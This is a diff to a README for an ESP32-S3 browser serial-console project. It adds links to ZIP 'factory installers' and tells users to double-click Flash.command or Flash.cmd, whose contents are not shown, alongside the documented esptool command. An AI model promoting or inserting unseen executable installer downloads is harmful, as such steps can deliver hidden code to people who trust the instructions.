@@ -6,6 +6,10 @@ Open a switch or access point's serial console in a browser. An ESP32-S3 stays b
 
 ## Flash and connect
 
+**Offline factory installers** · [macOS (Apple silicon and Intel)](https://raw.githubusercontent.com/msghubray-sys/esp32-s3-web-serial-console/main/ESP32-S3-macOS.zip) · [Windows x64](https://raw.githubusercontent.com/msghubray-sys/esp32-s3-web-serial-console/main/ESP32-S3-Windows.zip)
+
+Extract the entire ZIP, connect the board by USB and double-click `Flash.command` on macOS or `Flash.cmd` on Windows. Confirm the factory installation and USB port when prompted. Flashing clears the board's Wi-Fi, Tailscale and console settings.
+
 The supplied image targets an ESP32-S3 N16R8 (16 MB flash, 8 MB octal PSRAM). For **first installation**, use esptool 4.x and replace PORT with your board's serial port. This merged image overwrites settings in the NVS partition.
 ```sh
 python -m esptool --chip esp32s3 -p PORT write_flash 0x0 firmware/switch-console-s3-n16r8.bin
